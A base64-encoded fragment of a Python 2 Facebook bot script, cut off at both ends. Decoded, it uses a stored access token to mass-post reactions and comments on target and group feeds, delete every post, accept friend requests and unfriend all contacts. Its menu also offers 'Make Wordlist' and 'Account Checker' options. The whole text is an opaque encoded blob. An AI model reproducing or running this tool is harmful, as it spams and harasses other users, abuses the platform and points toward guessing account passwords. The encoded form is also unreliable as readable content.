djbGVhcicpCiAgICB0cnk6CiAgICAgICAgdG9rZXQgPSBvcGVuKCdsb2dpbi50eHQnLCAncicpLnJlYWQoKQogICAgZXhjZXB0IElPRXJyb3I6CiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kJwogICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgIGxvZ2luKCkKICAgIGVsc2U6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQgbG9nbwogICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgaWRlID0gcmF3X2lucHV0KCdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1JRCBHcm91cCBceDFiWzE7OTFtOlx4MWJbMTs5N20gJykKICAgICAgICBsaW1pdCA9IHJhd19pbnB1dCgnXHgxYlsxOzkxbVshXSBceDFiWzE7OTJtTGltaXQgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcpCiAgICAgICAgYWggPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL2dyb3VwLz9pZD0nICsgaWRlICsgJyZhY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgICAgIGFzdyA9IGpzb24ubG9hZHMoYWgudGV4dCkKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceDFiWzE7OTZtXHhlMlx4OWNceDkzXHgxYlsxOzkxbV0gXHgxYlsxOzkybU5hbWUgZ3JvdXAgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcgKyBhc3dbJ25hbWUnXQogICAgICAgIHRyeToKICAgICAgICAgICAgb2ggPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YzLjAvJyArIGlkZSArICc/ZmllbGRzPWZlZWQubGltaXQoJyArIGxpbWl0ICsgJykmYWNjZXNzX3Rva2VuPScgKyB0b2tldCkKICAgICAgICAgICAgYWggPSBqc29uLmxvYWRzKG9oLnRleHQpCiAgICAgICAgICAgIGphbGFuKCdceDFiWzE7OTFtW1x4ZTJceDljXHhiYV0gXHgxYlsxOzkybVBsZWFzZSB3YWl0IFx4MWJbMTs5N20uLi4nKQogICAgICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgICAgICBmb3IgYSBpbiBhaFsnZmVlZCddWydkYXRhJ106CiAgICAgICAgICAgICAgICB5ID0gYVsnaWQnXQogICAgICAgICAgICAgICAgcmVha3NpZ3J1cC5hcHBlbmQoeSkKICAgICAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycgKyB5ICsgJy9yZWFjdGlvbnM/dHlwZT0nICsgdGlwZSArICcmYWNjZXNzX3Rva2VuPScgKyB0b2tldCkKICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTJtW1x4MWJbMTs5N20nICsgeVs6MTBdLnJlcGxhY2UoJ1xuJywgJyAnKSArICcuLi4gXHgxYlsxOzkybV0gXHgxYlsxOzk3bScgKyB0aXBlCgogICAgICAgICAgICBwcmludAogICAgICAgICAgICBwcmludCAnXHJceDFiWzE7OTFtWytdXHgxYlsxOzk3bSBGaW5pc2ggXHgxYlsxOzk2bScgKyBzdHIobGVuKHJlYWtzaWdydXApKQogICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICBtZW51X2JvdCgpCiAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBJRCBub3QgZm91bmQnCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIG1lbnVfYm90KCkKCgpkZWYgYm90X2tvbWVuKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHRyeToKICAgICAgICB0b2tldCA9IG9wZW4oJ2xvZ2luLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUb2tlbiBub3QgZm91bmQnCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgbG9naW4oKQogICAgZWxzZToKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICBwcmludCAiXHgxYlsxOzkxbVshXSBceDFiWzE7OTJtVXNlIFx4MWJbMTs5N20nPD4nIFx4MWJbMTs5Mm0gZm9yIG5ld2xpbmUiCiAgICAgICAgaWRlID0gcmF3X2lucHV0KCdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1JRCBUYXJnZXQgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcpCiAgICAgICAga20gPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybUNvbW1lbnRzICBceDFiWzE7OTFtOlx4MWJbMTs5N20gJykKICAgICAgICBsaW1pdCA9IHJhd19pbnB1dCgnXHgxYlsxOzkxbVshXSBceDFiWzE7OTJtTGltaXQgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcpCiAgICAgICAga20gPSBrbS5yZXBsYWNlKCc8PicsICdcbicpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBwID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nICsgaWRlICsgJz9maWVsZHM9ZmVlZC5saW1pdCgnICsgbGltaXQgKyAnKSZhY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgICAgICAgICBhID0ganNvbi5sb2FkcyhwLnRleHQpCiAgICAgICAgICAgIGphbGFuKCdceDFiWzE7OTFtW1x4ZTJceDljXHhiYV0gXHgxYlsxOzkybVBsZWFzZSB3YWl0IFx4MWJbMTs5N20uLi4nKQogICAgICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgICAgICBmb3IgcyBpbiBhWydmZWVkJ11bJ2RhdGEnXToKICAgICAgICAgICAgICAgIGYgPSBzWydpZCddCiAgICAgICAgICAgICAgICBrb21lbi5hcHBlbmQoZikKICAgICAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycgKyBmICsgJy9jb21tZW50cz9tZXNzYWdlPScgKyBrbSArICcmYWNjZXNzX3Rva2VuPScgKyB0b2tldCkKICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTJtW1x4MWJbMTs5N20nICsga21bOjEwXS5yZXBsYWNlKCdcbicsICcgJykgKyAnLi4uIFx4MWJbMTs5Mm1dJwoKICAgICAgICAgICAgcHJpbnQKICAgICAgICAgICAgcHJpbnQgJ1xyXHgxYlsxOzkxbVsrXVx4MWJbMTs5N20gRmluaXNoIFx4MWJbMTs5Nm0nICsgc3RyKGxlbihrb21lbikpCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIG1lbnVfYm90KCkKICAgICAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIElEIG5vdCBmb3VuZCcKICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgbWVudV9ib3QoKQoKCmRlZiBncnVwX2tvbWVuKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHRyeToKICAgICAgICB0b2tldCA9IG9wZW4oJ2xvZ2luLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUb2tlbiBub3QgZm91bmQnCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgbG9naW4oKQogICAgZWxzZToKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICBwcmludCAiXHgxYlsxOzkxbVshXSBceDFiWzE7OTJtR3VuYWthbiBceDFiWzE7OTdtJzw+JyBceDFiWzE7OTJtVW50dWsgQmFyaXMgQmFydSIKICAgICAgICBpZGUgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybUlEIEdyb3VwICBceDFiWzE7OTFtOlx4MWJbMTs5N20gJykKICAgICAgICBrbSA9IHJhd19pbnB1dCgnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtQ29tbWVudHMgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcpCiAgICAgICAgbGltaXQgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bIV0gXHgxYlsxOzkybUxpbWl0IFx4MWJbMTs5MW06XHgxYlsxOzk3bSAnKQogICAgICAgIGttID0ga20ucmVwbGFjZSgnPD4nLCAnXG4nKQogICAgICAgIHRyeToKICAgICAgICAgICAgYWggPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL2dyb3VwLz9pZD0nICsgaWRlICsgJyZhY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgICAgICAgICBhc3cgPSBqc29uLmxvYWRzKGFoLnRleHQpCiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4MWJbMTs5Nm1ceGUyXHg5Y1x4OTNceDFiWzE7OTFtXSBceDFiWzE7OTJtTmFtZSBncnVwIFx4MWJbMTs5MW06XHgxYlsxOzk3bSAnICsgYXN3WyduYW1lJ10KICAgICAgICAgICAgcCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjMuMC8nICsgaWRlICsgJz9maWVsZHM9ZmVlZC5saW1pdCgnICsgbGltaXQgKyAnKSZhY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgICAgICAgICBhID0ganNvbi5sb2FkcyhwLnRleHQpCiAgICAgICAgICAgIGphbGFuKCdceDFiWzE7OTFtW1x4ZTJceDljXHhiYV0gXHgxYlsxOzkybVBsZWFzZSB3YWl0IFx4MWJbMTs5N20uLi4nKQogICAgICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgICAgICBmb3IgcyBpbiBhWydmZWVkJ11bJ2RhdGEnXToKICAgICAgICAgICAgICAgIGYgPSBzWydpZCddCiAgICAgICAgICAgICAgICBrb21lbmdydXAuYXBwZW5kKGYpCiAgICAgICAgICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nICsgZiArICcvY29tbWVudHM/bWVzc2FnZT0nICsga20gKyAnJmFjY2Vzc190b2tlbj0nICsgdG9rZXQpCiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkybVtceDFiWzE7OTdtJyArIGttWzoxMF0ucmVwbGFjZSgnXG4nLCAnICcpICsgJy4uLiBceDFiWzE7OTJtXScKCiAgICAgICAgICAgIHByaW50CiAgICAgICAgICAgIHByaW50ICdcclx4MWJbMTs5MW1bK11ceDFiWzE7OTdtIEZpbmlzaCBceDFiWzE7OTZtJyArIHN0cihsZW4oa29tZW5ncnVwKSkKICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgbWVudV9ib3QoKQogICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gSUQgbm90IGZvdW5kJwogICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICBtZW51X2JvdCgpCgoKZGVmIGRlbGV0ZXBvc3QoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgdHJ5OgogICAgICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywgJ3InKS5yZWFkKCkKICAgICAgICBuYW0gPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nICsgdG9rZXQpCiAgICAgICAgbG9sID0ganNvbi5sb2FkcyhuYW0udGV4dCkKICAgICAgICBuYW1hID0gbG9sWyduYW1lJ10KICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCcKICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICBsb2dpbigpCgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCBsb2dvCiAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgcHJpbnQgJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybUZyb20gXHgxYlsxOzkxbTogXHgxYlsxOzk3bSVzJyAlIG5hbWEKICAgIGphbGFuKCdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1TdGFydGluZyByZW1vdmUgc3RhdHVzXHgxYlsxOzk3bSAuLi4nKQogICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgIGFzdSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZmVlZD9hY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgYXN1cyA9IGpzb24ubG9hZHMoYXN1LnRleHQpCiAgICBmb3IgcCBpbiBhc3VzWydkYXRhJ106CiAgICAgICAgaWQgPSBwWydpZCddCiAgICAgICAgcGlybyA9IDAKICAgICAgICB1cmwgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycgKyBpZCArICc/bWV0aG9kPWRlbGV0ZSZhY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgICAgIG9rID0ganNvbi5sb2Fkcyh1cmwudGV4dCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGVycm9yID0gb2tbJ2Vycm9yJ11bJ21lc3NhZ2UnXQogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceDFiWzE7OTdtJyArIGlkWzoxMF0ucmVwbGFjZSgnXG4nLCAnICcpICsgJy4uLicgKyAnXHgxYlsxOzkxbV0gXHgxYlsxOzk1bUZhaWxlZCcKICAgICAgICBleGNlcHQgVHlwZUVycm9yOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkybVtceDFiWzE7OTdtJyArIGlkWzoxMF0ucmVwbGFjZSgnXG4nLCAnICcpICsgJy4uLicgKyAnXHgxYlsxOzkybV0gXHgxYlsxOzk2bVJlbW92ZWQnCiAgICAgICAgICAgIHBpcm8gKz0gMQogICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gQ29ubmVjdGlvbiBFcnJvcicKICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgbWVudV9ib3QoKQoKICAgIHByaW50ICdcblx4MWJbMTs5MW1bK10gXHgxYlsxOzk3bUZpbmlzaCcKICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICBtZW51X2JvdCgpCgoKZGVmIGFjY2VwdCgpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICB0cnk6CiAgICAgICAgdG9rZXQgPSBvcGVuKCdsb2dpbi50eHQnLCAncicpLnJlYWQoKQogICAgZXhjZXB0IElPRXJyb3I6CiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kJwogICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgIGxvZ2luKCkKCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50IGxvZ28KICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICBsaW1pdCA9IHJhd19pbnB1dCgnXHgxYlsxOzkxbVshXSBceDFiWzE7OTJtTGltaXQgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcpCiAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRyZXF1ZXN0cz9saW1pdD0nICsgbGltaXQgKyAnJmFjY2Vzc190b2tlbj0nICsgdG9rZXQpCiAgICBmcmllbmRzID0ganNvbi5sb2FkcyhyLnRleHQpCiAgICBpZiAnW10nIGluIHN0cihmcmllbmRzWydkYXRhJ10pOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIE5vIGZyaWVuZHMgcmVxdWVzdCcKICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgIG1lbnVfYm90KCkKICAgIGphbGFuKCdceDFiWzE7OTFtW1x4ZTJceDljXHhiYV0gXHgxYlsxOzkybVBsZWFzZSB3YWl0IFx4MWJbMTs5N20uLi4nKQogICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgIGZvciBpIGluIGZyaWVuZHNbJ2RhdGEnXToKICAgICAgICBnYXMgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzLycgKyBpWydmcm9tJ11bJ2lkJ10gKyAnP2FjY2Vzc190b2tlbj0nICsgdG9rZXQpCiAgICAgICAgYSA9IGpzb24ubG9hZHMoZ2FzLnRleHQpCiAgICAgICAgaWYgJ2Vycm9yJyBpbiBzdHIoYSk6CiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1OYW1lICBceDFiWzE7OTFtOlx4MWJbMTs5N20gJyArIGlbJ2Zyb20nXVsnbmFtZSddCiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1JRCAgICBceDFiWzE7OTFtOlx4MWJbMTs5N20gJyArIGlbJ2Zyb20nXVsnaWQnXSArICdceDFiWzE7OTFtIEZhaWxlZCcKICAgICAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtTmFtZSAgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcgKyBpWydmcm9tJ11bJ25hbWUnXQogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtSUQgICAgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcgKyBpWydmcm9tJ11bJ2lkJ10gKyAnXHgxYlsxOzkybSBCZXJoYXNpbCcKICAgICAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKCiAgICBwcmludCAnXG5ceDFiWzE7OTFtWytdIFx4MWJbMTs5N21GaW5pc2gnCiAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgbWVudV9ib3QoKQoKCmRlZiB1bmZyaWVuZCgpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICB0cnk6CiAgICAgICAgdG9rZXQgPSBvcGVuKCdsb2dpbi50eHQnLCAncicpLnJlYWQoKQogICAgZXhjZXB0IElPRXJyb3I6CiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kJwogICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgIGxvZ2luKCkKICAgIGVsc2U6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQgbG9nbwogICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgamFsYW4oJ1x4MWJbMTs5MW1bXHhlMlx4OWNceGJhXSBceDFiWzE7OTJtUGxlYXNlIHdhaXQgXHgxYlsxOzk3bS4uLicpCiAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICBwcmludCAnXHgxYlsxOzk3bVN0b3AgXHgxYlsxOzkxbUNUUkwrQycKICAgICAgICBwcmludAogICAgICAgIHRyeToKICAgICAgICAgICAgcGVrID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0nICsgdG9rZXQpCiAgICAgICAgICAgIGNvayA9IGpzb24ubG9hZHMocGVrLnRleHQpCiAgICAgICAgICAgIGZvciBpIGluIGNva1snZGF0YSddOgogICAgICAgICAgICAgICAgbmFtYSA9IGlbJ25hbWUnXQogICAgICAgICAgICAgICAgaWQgPSBpWydpZCddCiAgICAgICAgICAgICAgICByZXF1ZXN0cy5kZWxldGUoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/dWlkPScgKyBpZCArICcmYWNjZXNzX3Rva2VuPScgKyB0b2tldCkKICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTdtW1x4MWJbMTs5Mm1SZW1vdmVceDFiWzE7OTdtXSAnICsgbmFtYSArICcgPT4gJyArIGlkCgogICAgICAgIGV4Y2VwdCBJbmRleEVycm9yOgogICAgICAgICAgICBwYXNzCiAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBTdG9wcGVkJwogICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICBtZW51X2JvdCgpCgogICAgcHJpbnQgJ1xuXHgxYlsxOzkxbVsrXSBceDFiWzE7OTdtRmluaXNoJwogICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgIG1lbnVfYm90KCkKCgpkZWYgbGFpbigpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICB0cnk6CiAgICAgICAgdG9rZXQgPSBvcGVuKCdsb2dpbi50eHQnLCAncicpLnJlYWQoKQogICAgZXhjZXB0IElPRXJyb3I6CiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kJwogICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgIGxvZ2luKCkKCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50IGxvZ28KICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICBwcmludCAn4pWRLT4gXHgxYlsxOzM3OzQwbTEuIFdyaXRlIFN0YXR1cycKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtMi4gTWFrZSBXb3JkbGlzdCcKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtMy4gQWNjb3VudCBDaGVja2VyJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG00LiBMaXN0IEdyb3VwJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG01LiBQcm9maWxlIEd1YXJkJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszMTs0MG0wLiBCYWNrJwogICAgcHJpbnQgJ1x4MWJbMTszNzs0MG3ilZEnCiAgICBwaWxpaF9sYWluKCkKCgpkZWYgcGlsaWhfbGFpbigpOgogICAgb3RoZXIgPSByYXdfaW5wdXQoJ+KVmuKVkFx4MWJbMTs5MW3ilrZceDFiWzE7OTdtICcpCiAgICBpZiBvdGhlciA9PSAnJzoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBDYW5cJ3QgZW1wdHknCiAgICAgICAgcGlsaWhfbGFpbigpCiAgICBlbHNlOgogICAgICAgIGlmIG90aGVyID09ICcxJzoKICAgICAgICAgICAgc3RhdHVzKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiBvdGhlciA9PSAnMic6CiAgICAgICAgICAgICAgICB3b3JkbGlzdCgpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBpZiBvdGhlciA9PSAnMyc6CiAgICAgICAgICAgICAgICAgICAgY2hlY2tfYWt1bigpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIGlmIG90aGVyID09ICc0JzoKICAgICAgICAgICAgICAgICAgICAgICAgZ3J1cHNheWEoKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG90aGVyID09ICc1JzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGd1YXJkKCkKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG90aGVyID09ICcwJzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZW51KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWNceDk2XSBceDFiWzE7OTdtJyArIG90aGVyICsgJyBceDFiWzE7OTFtbm90IGZvdW5kJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBpbGloX2xhaW4oKQoKCmRlZiBzdGF0dXMoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgdHJ5OgogICAgICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCcKICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICBsb2dpbigpCgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCBsb2dvCiAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgbXNnID0gcmF3X2lucHV0KCdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1Xcml0ZSBzdGF0dXMgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcpCiAgICBpZiBtc2cgPT0gJyc6CiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gQ2FuXCd0IGVtcHR5JwogICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgbGFpbigpCiAgICBlbHNlOgogICAgICAgIHJlcyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZmVlZD9tZXRob2Q9UE9TVCZtZXNzYWdlPScgKyBtc2cgKyAnJmFjY2Vzc190b2tlbj0nICsgdG9rZXQpCiAgICAgICAgb3AgPSBqc29uLmxvYWRzKHJlcy50ZXh0KQogICAgICAgIGphbGFuKCdceDFiWzE7OTFtW1x4ZTJceDljXHhiYV0gXHgxYlsxOzkybVBsZWFzZSB3YWl0IFx4MWJbMTs5N20uLi4nKQogICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybVN0YXR1cyBJRFx4MWJbMTs5MW0gOiBceDFiWzE7OTdtJyArIG9wWydpZCddCiAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICA